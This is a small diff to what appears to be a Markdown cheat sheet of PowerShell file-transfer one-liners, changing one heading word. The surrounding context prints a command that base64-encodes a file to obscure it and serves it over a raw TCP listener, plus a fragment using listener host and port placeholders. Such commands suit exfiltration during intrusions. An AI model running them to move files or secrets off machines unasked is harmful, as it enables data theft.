@@ -244,7 +244,7 @@ $FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPo
 
 ##### If you want to obfuscate the data being transfered by converting it to a base64 string:
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows client:
 
 ```
 $FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $Listener = [System.Net.Sockets.TcpListener]::Create($LPORT); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()
